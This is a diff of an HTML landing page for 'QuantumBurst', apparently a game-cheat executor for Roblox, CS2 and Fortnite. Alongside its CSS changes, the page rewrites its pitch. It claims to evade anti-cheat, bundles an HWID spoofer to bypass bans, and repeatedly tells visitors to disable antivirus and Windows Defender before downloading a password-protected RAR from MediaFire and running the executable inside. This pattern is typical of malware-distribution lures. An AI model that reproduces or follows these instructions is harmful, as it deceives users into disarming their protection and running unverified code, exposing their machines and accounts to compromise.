@@ -52,8 +52,6 @@
       font-family: 'Orbitron', sans-serif;
       font-size: 2.2rem;
       font-weight: 800;
-      z-index: 2;
-      position: relative;
       background: linear-gradient(270deg, #ff00cc, #00ffff, #00ff00, #ffff00, #ff6600, #ff00cc);
       background-size: 1200% 1200%;
       -webkit-background-clip: text;
@@ -72,8 +70,6 @@
       margin: 0 auto;
       padding: 60px 20px 100px;
       text-align: center;
-      z-index: 2;
-      position: relative;
       animation: fadeInUp 1.2s ease-out both;
     }
 
@@ -124,8 +120,6 @@
     }
 
     .download-btn {
-      position: relative;
-      overflow: hidden;
       margin-top: 40px;
       display: inline-block;
       background: linear-gradient(135deg, #a000ff, #ff00cc);
@@ -136,26 +130,8 @@
       text-decoration: none;
       border-radius: 30px;
       box-shadow: 0 0 25px #a000ff, 0 0 40px #ff00cc;
-      transition: transform 0.2s ease, box-shadow 0.3s ease;
+      transition: transform 0.3s, box-shadow 0.3s;
       animation: pulse 2s infinite alternate ease-in-out, fadeInUp 2s ease-out both;
-    }
-
-    .download-btn::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -75%;
-      width: 50%;
-      height: 100%;
-      background: linear-gradient(to right, rgba(255,255,255,0.3), rgba(255,255,255,0));
-      transform: skewX(-20deg);
-      animation: shimmer 2s infinite;
-    }
-
-    @keyframes shimmer {
-      0% { left: -75%; }
-      50% { left: 125%; }
-      100% { left: 125%; }
     }
 
     .download-btn:hover {
@@ -163,17 +139,25 @@
       box-shadow: 0 0 40px #ff00ff, 0 0 80px #a000ff;
     }
 
-    .download-btn:active {
-      transform: scale(0.97);
-      box-shadow: 0 0 20px #800080, 0 0 40px #ff00ff inset;
+    .video-box {
+      margin: 30px auto 0;
+      padding: 10px;
+      border-radius: 15px;
+      width: fit-content;
+      animation: rainbowGlow 4s linear infinite;
+    }
+
+    @keyframes rainbowGlow {
+      0% { box-shadow: 0 0 15px #ff00cc, 0 0 30px #ff00cc inset; }
+      25% { box-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff inset; }
+      50% { box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00 inset; }
+      75% { box-shadow: 0 0 15px #ffff00, 0 0 30px #ffff00 inset; }
+      100% { box-shadow: 0 0 15px #ff00cc, 0 0 30px #ff00cc inset; }
     }
 
     iframe {
       border-radius: 10px;
-      box-shadow: 0 0 15px #aa00ff;
-      margin-top: 20px;
       max-width: 100%;
-      animation: fadeInUp 2.2s ease-out both;
     }
 
     footer {
@@ -205,32 +189,40 @@
     <div class="tagline">The First & Best External Executor After BYFRON, LVL 7 Executor.</div>
 
     <p>This universal tool is designed for <strong>Roblox, CS2, and Fortnite</strong>. It enhances your gameplay by making you perform better with built-in features that give you the edge competitively.</p>
-    <p>Powered by cutting-edge technology, QuantumBurst guarantees <strong>zero lag and a smooth experience</strong>. Most impressively, it's <strong>fully undetectable by any known anti-cheat system</strong>.</p>
-    <p>It includes a built-in <strong>spoofer</strong>—a hardware ID (HWID) changer—so you don’t need to buy one. Bypass bans and stay anonymous effortlessly.</p>
+    <p>Powered by cutting-edge technology, QuantumBurst guarantees <strong>zero lag and a smooth experience</strong>. Most impressively, it's <strong>fully undetectable by any known anti-cheat system</strong>—thanks to our next-gen stealth injection tech.</p>
+    <p>It also includes a built-in <strong>spoofer</strong>—a hardware ID (HWID) changing tool—so you don’t need to purchase one separately. This protects your identity and lets you bypass hardware bans automatically.</p>
 
     <div class="warning">
-      Disable antivirus before using. Our tool may be falsely flagged due to its advanced features. It's safe to use.
+      Before downloading, disable your virus protection. Some antivirus programs may flag our tool as a false positive due to its advanced features. This is common with cutting-edge software and doesn’t indicate a real threat—rest assured, it’s safe to use after disabling protection temporarily.
     </div>
 
-    <div style="margin-top: 40px; background: rgba(0, 0, 50, 0.6); border: 1px solid #aa00ff; border-radius: 10px; padding: 30px; max-width: 700px; margin-left: auto; margin-right: auto; box-shadow: 0 0 20px #5500ff; color: #e0e0ff;">
-      <h2 style="margin-bottom: 15px; color: #ff66ff;">🔐 How to Extract</h2>
+    <div style="margin-top: 40px; background: rgba(0, 0, 50, 0.6); border: 1px solid #aa00ff; border-radius: 10px; padding: 30px; max-width: 700px; margin-left: auto; margin-right: auto; box-shadow: 0 0 20px #5500ff; color: #e0e0ff; animation: fadeInUp 2s ease-out both;">
+      <h2 style="margin-bottom: 15px; color: #ff66ff;">🔐 How to Extract the Downloaded Folder</h2>
       <ol style="text-align: left; padding-left: 20px; line-height: 1.8;">
-        <li>Download and install <a href="https://www.win-rar.com/start.html?&L=0" target="_blank" style="color:#00ccff;">WinRAR</a> or <a href="https://www.7-zip.org/download.html" target="_blank" style="color:#00ccff;">7-Zip</a>.</li>
-        <li>Right-click the downloaded file.</li>
-        <li>Select <strong>"Extract Here"</strong>.</li>
-        <li>Enter password: <strong style="color: #00ffcc;">Quantum</strong></li>
-        <li>Launch the .exe file inside.</li>
+        <li>Right-click the downloaded ZIP or RAR file.</li>
+        <li>Select <strong>"Extract Here"</strong> or <strong>"Extract to [folder]"</strong>.</li>
+        <li>When prompted for a password, enter: <strong style="color: #00ffcc;">Quantum</strong></li>
+        <li>Wait for the extraction to complete.</li>
+        <li>Open the extracted folder and run the application inside.</li>
       </ol>
+      <p style="margin-top: 15px; font-style: italic; color: #aaa;">You can use <a href="https://www.7-zip.org/" target="_blank" style="color:#00ffff;">7-Zip</a> or <a href="https://www.win-rar.com/start.html?&L=0" target="_blank" style="color:#00ffff;">WinRAR</a> to extract the files if you don’t already have them.</p>
     </div>
 
-    <a href="https://www.mediafire.com/file/rc6q5ujynta8upf/Quantum.rar/file" class="download-btn" target="_blank" rel="noopener">DOWNLOAD NOW</a>
+    <a href="https://www.mediafire.com/file/5379q7566uj4kn2/QuantumLoader.rar/file" class="download-btn" target="_blank" rel="noopener">DOWNLOAD NOW</a>
 
     <div style="margin-top: 60px;">
       <h2 style="color: #ff4444;">⚠️ Disable Antivirus Guide</h2>
       <p style="max-width: 700px; margin: 10px auto; color: #ccc;">
-        If flagged, follow the video below to disable antivirus. You can turn it back on afterward.
+        If Windows Defender flags this tool, follow the video below to temporarily disable real-time protection. You can turn it back on after using the tool.
       </p>
-      <iframe width="560" height="315" src="https://www.youtube.com/embed/8qWfnsjI4rM" title="Disable Antivirus" frameborder="0" allowfullscreen></iframe>
+      <div class="video-box">
+        <iframe width="560" height="315"
+          src="https://www.youtube.com/embed/8qWfnsjI4rM"
+          title="How to Disable Windows Defender Antivirus"
+          frameborder="0"
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+          allowfullscreen></iframe>
+      </div>
     </div>
   </main>
 
